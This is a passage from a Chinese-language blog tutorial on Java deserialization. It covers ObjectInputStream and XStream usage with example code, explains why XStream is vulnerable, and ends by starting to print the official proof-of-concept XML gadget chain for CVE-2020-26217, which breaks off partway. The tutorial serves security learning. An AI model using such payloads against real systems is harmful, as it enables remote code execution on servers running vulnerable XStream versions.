方法会确保对象的每次写入都是独立的，即使同一个对象多次写入，每次写入都会被视为独立的对象。这可以用于避免在序列化过程中引入对象的循环引用或共享状态。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、XMLEncoder：XMLEncoder 类用于将 Java 对象序列化为 XML 格式的数据。它可以将 Java 对象图转换为 XML 数据。可以使用 XMLEncoder 的构造函数创建一个实例，传入一个输出流（如文件输出流、URL 输出流等），然后使用 writeObject() 方法将对象写入输出流</span><br></pre></td></tr></table></figure></div><h4 id="反序列"><a href="#反序列" class="headerlink" title="反序列"></a>反序列</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、readObject()：为 ObjectInputStream 类中的一个方法，用于从输入流中读取序列化的对象并进行反序列化。它是在实现了 java.io.Serializable 接口的类中定义的。当你调用 readObject() 方法时，它会从输入流中读取对象的序列化数据，并将其还原为原始对象。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、readUnshared()：该函数与 readObject() 类似，用于从输入流中读取序列化的对象进行反序列化。不同之处在于，readUnshared() 函数会确保每次读取的对象都是独立的，即使同一个对象多次读取，每次读取都会被视为独立的对象。这可以用于避免在反序列化过程中共享对象状态。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、XMLDecoder：XMLDecoder 类用于从 XML 文件或输入流中读取 XML 数据并将其反序列化为 Java 对象。它可以将 XML 数据转换为 Java 对象图。可以使用 XMLDecoder 的构造函数创建一个实例，传入一个输入流（如文件输入流、URL 输入流等），然后使用 readObject() 方法从输入流中读取对象</span><br></pre></td></tr></table></figure></div><blockquote><p>java.io.Serializable 接口是 Java 中的一个标记接口（marker interface），用于指示类的对象可以被序列化和反序列化。实现了 Serializable 接口的类可以通过 ObjectOutputStream 将其对象转换为字节流进行序列化，并通过 ObjectInputStream 将字节流转换回对象进行反序列化。</p></blockquote><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"># SerializationExample 类中定义了两个方法 serializeObject、deserializeObject</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;serializedObject.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象</span></span><br><span class="line">        serializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> deserializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的对象信息</span></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化对象，定义 serializeObject 方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>);</span><br><span class="line">            objectOutputStream.writeObject(person);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;对象序列化成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化对象，定义 deserializeObject 方法，对象为 Person</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title function_">deserializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) objectInputStream.readObject();</span><br><span class="line">            <span class="keyword">return</span> deserializedPerson;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 Person 类实现 Serializable 接口，表示该类支持序列化和反序列化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153747461.png" data-caption="image-20230812153747461"><img src="/../images/Java/deserialization/image-20230812153747461.png" alt="image-20230812153747461"></a></p><h2 id="三、漏洞案例"><a href="#三、漏洞案例" class="headerlink" title="三、漏洞案例"></a>三、漏洞案例</h2><h3 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h3><p>XStream 是一个简单的基于 Java 的类库，用来将 Java 对象序列化成 XML（JSON）或反序列化为对象。</p><p>XStream 反序列化漏洞的具体原因如下：</p><ul><li><p>默认支持任意类的反序列化：XStream 的默认配置允许将任意类进行反序列化，而不仅仅限于预期的类。这意味着攻击者可以构造特制的XML数据，其中包含恶意代码或恶意类的引用。</p></li><li><p>类加载器的问题：XStream 在反序列化时会使用当前线程的上下文类加载器来加载类。如果攻击者能够控制类加载器或提供恶意的类加载器，就可以加载和执行恶意类。</p></li><li><p>默认安全忽略策略：XStream 默认情况下会忽略一些敏感的 Java 类，如 java.lang.Runtime、java.lang.ProcessBuilder 等。然而，这个默认的安全忽略策略可能不够严格，攻击者可以绕过这些限制。</p></li></ul><blockquote><p>影响范围</p></blockquote><p>在1.4.x 系列版本中，&lt;&#x3D;1.4.6 或 &#x3D; 1.4.10 存在反序列化漏洞</p><blockquote><p>XStream 的序列化与反序列化</p></blockquote><p>XStream 的序列化与反序列与 Java 原生的序列化反序列化机制存在差异，XStream 使用的是独立的一套机制，主要核心是通过 Converter 转换器来将 XML 和对象之间进行相互的转换，简单的来说就是：<code>将特定类型的对象转换为 XML 或者将 XML 转换为特定类型的对象</code>，具体需要先实现以下3个方法：</p><ul><li><p>canConvert 方法：告诉 XStream 对象，它能够转换的对象；</p></li><li><p>marshal 方法：能够将对象转换为XML时候的具体操作；</p></li><li><p>unmarshal 方法：能够将XML转换为对象时的具体操作；</p></li></ul><p>具体可参考官方文档：<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a> ，下图为转换的类型格式</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817152242552.png" data-caption="image-20230817152242552"><img src="/../images/Java/deserialization/image-20230817152242552.png" alt="image-20230817152242552"></a></p><p>例子：使用了 <code>xstream.toXML()</code> 方法将 <code>person</code> 类的对象字符串序列化为 <code>xml</code> 格式</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//创建 XStream 实例</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象序列化为 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person 类的构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214904136.png" data-caption="image-20230813214904136"><img src="/../images/Java/deserialization/image-20230813214904136.png" alt="image-20230813214904136"></a></p><p>反序列化则使用了 <code>xstream.fromXML()</code> 方法将已经序列化的<code>xml</code>反序列化为字符</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置类名的别名,以便下面的 xml 中的 &lt;person&gt; 能被读取</span></span><br><span class="line">        xstream.alias(<span class="string">&quot;person&quot;</span>, Person.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义要反序列化的 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;person&gt;&lt;name&gt;John&lt;/name&gt;&lt;age&gt;30&lt;/age&gt;&lt;/person&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 XML 反序列化为 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的 Person 对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + person.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 name 属性的方法</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 age 属性的方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214805534.png" data-caption="image-20230813214805534"><img src="/../images/Java/deserialization/image-20230813214805534.png" alt="image-20230813214805534"></a></p><p>完整的序列化与反序列化，程序先将字符串序列化为 <code>xml</code> 格式，然后再将已经为 <code>xml</code> 格式反序列化为字符串</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person 类的构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在 Person 类中定义 getter 和 setter 方法</span></span><br><span class="line">        <span class="comment">// 这些方法用于序列化和反序列化时访问属性</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//创建 XStream 实例</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象序列化为 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized XML:&quot;</span>);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 XML 字符串反序列化为对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line">        System.out.println(<span class="string">&quot;\nDeserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813215458252.png" data-caption="image-20230813215458252"><img src="/../images/Java/deserialization/image-20230813215458252.png" alt="image-20230813215458252"></a></p><blockquote><p>上述案例 Pom.xml 如下</p></blockquote><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-example<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h4><blockquote><p>官方漏洞通告</p></blockquote><p><code>https://x-stream.github.io/CVE-2020-26217.html</code> ， XStream 代码中可直接利用用户控制的请求输入的 xml 数据作为 fromXML 的参数使用，这里输入可能是输入流、文件、post参数等，并且程序中没有设置允许反序列化类的白名单，导致反序列化漏洞。漏洞版本为 <code>1.4.13</code>。</p><p>官方 Poc</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span 